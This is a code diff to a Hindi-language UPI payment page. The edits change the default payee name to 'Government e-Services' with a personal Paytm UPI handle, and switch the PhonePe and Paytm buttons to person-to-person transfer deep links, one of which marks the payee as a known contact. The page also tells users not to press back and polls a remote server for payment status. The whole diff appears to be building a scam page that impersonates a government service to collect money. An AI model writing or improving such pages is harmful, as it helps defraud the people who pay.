@@ -188,7 +188,7 @@
                 <!-- Auto-Verify Status Box Connected to Live Render Backend -->
                 <div id="status-box" class="mt-5 p-2.5 bg-blue-50 border border-blue-100 rounded-lg flex items-center gap-2.5 text-xs text-blue-900 font-medium">
                     <i id="status-icon" class="fas fa-spinner fa-spin text-blue-700 text-sm"></i>
-                    <span id="status-text">भुगतान सत्यापन की प्रतीक्षा है। लाइव ट्रैकिंग चालू है...</span>
+                    <span id="status-text">भुगतान सत्यापन की प्रतीक्षा है। कृपया बैक बटन न दबाएं।</span>
                 </div>
 
             </div>
@@ -231,6 +231,7 @@
                         if(pollInterval) clearInterval(pollInterval);
                         return; 
                     }
+                    
                     timeLeft--;
                     let m = Math.floor(timeLeft / 60); 
                     let s = timeLeft % 60; 
@@ -257,10 +258,10 @@
             try {
                 const urlParams = new URLSearchParams(window.location.search);
                 const finalPrice = parseFloat(urlParams.get('amount')) || 1.00;
-                const dynamicBrand = urlParams.get('brand') || 'Aarush Pvt Ltd';
-                const testUpiId = urlParams.get('upi') || "aarush-pvt-ltd@ybl";
+                const dynamicBrand = urlParams.get('brand') || 'Government e-Services';
+                const testUpiId = urlParams.get('upi') || "paytm.s1h6t6g@pty";
                 const transactionNote = urlParams.get('note') || `Fee for ${dynamicBrand}`;
-                currentOrderId = urlParams.get('orderId') || Math.floor(100000000 + Math.random() * 900000000);
+                currentOrderId = urlParams.get('orderId') || Math.floor(100000000 + Math.random() * 900000000).toString();
                 
                 // Update Text Content in UI
                 document.getElementById('brand-title').innerText = dynamicBrand;
@@ -298,11 +299,15 @@
                     if(qrImg) qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodedUpi}`;
                 }
 
-                // Standard Intent Links for Mobile Apps
-                if(phonepeLink) phonepeLink.href = upiString;
-                if(paytmLink) paytmLink.href = upiString;
+                // Application Deep Links
+                const phonepePayload = {
+                    contact: { cbcName: dynamicBrand, nickName: dynamicBrand, vpa: testUpiId, type: "VPA" },
+                    p2pPaymentCheckoutParams: { note: transactionNote, isByDefaultKnownContact: true, initialAmount: Math.round(Number(finalPrice) * 100), currency: "INR", checkoutType: "DEFAULT", transactionContext: "p2p" }
+                };
+                if(phonepeLink) phonepeLink.href = "phonepe://native?data=" + encodeURIComponent(btoa(JSON.stringify(phonepePayload))) + "&id=p2ppayment";
+                if(paytmLink) paytmLink.href = `paytmmp://cash_wallet?pa=${encodeURIComponent(testUpiId)}&pn=${encodeURIComponent(dynamicBrand)}&tn=${encodeURIComponent(transactionNote)}&am=${finalPrice.toFixed(2)}&cu=INR&featuretype=money_transfer`;
 
-                // Start Live Polling with Render Backend Server
+                // Start Live Polling with Render Server
                 startPaymentPolling();
 
             } catch(error) {
@@ -310,10 +315,11 @@
             }
         });
 
-        // Live Status Polling against live Render Server
+        // Status Polling from Render Server
         function startPaymentPolling() {
+            if (!currentOrderId) return;
             pollInterval = setInterval(() => {
-                fetch(`https://nansnja.onrender.com/api/check-status?orderId=${currentOrderId}`)
+                fetch(`https://nansnja.onrender.com/api/check-status?orderId=${encodeURIComponent(currentOrderId)}`)
                     .then(res => res.json())
                     .then(data => {
                         if (data.success && data.status === "SUCCESS") {
@@ -325,18 +331,18 @@
                             box.className = "mt-5 p-2.5 bg-emerald-50 border border-emerald-200 rounded-lg flex items-center gap-2.5 text-xs text-emerald-900 font-semibold";
                             icon.className = "fas fa-check-circle text-emerald-700 text-base";
                             text.innerHTML = "भुगतान सफल! (Payment Confirmed & Successful) ✅<br><span class='text-[10px] text-slate-500'>Order verified successfully.</span>";
-                            
+
                             if (typeof fbq === 'function') {
                                 fbq('track', 'Purchase', { currency: "INR", value: parseFloat(document.querySelector('.final_paid_price').innerText.replace('₹', '')) || 0 });
                             }
                         }
                     })
-                    .catch(err => console.log("Checking payment status..."));
+                    .catch(err => console.log("Waiting for confirmation..."));
             }, 3000);
         }
 
         // Copy UPI Button Action
-        window.copyUpi = function(event) {
+                window.copyUpi = function(event) {
             const copyText = document.getElementById("upiID");
             const btn = event.currentTarget; 
             if(copyText && copyText.value) {
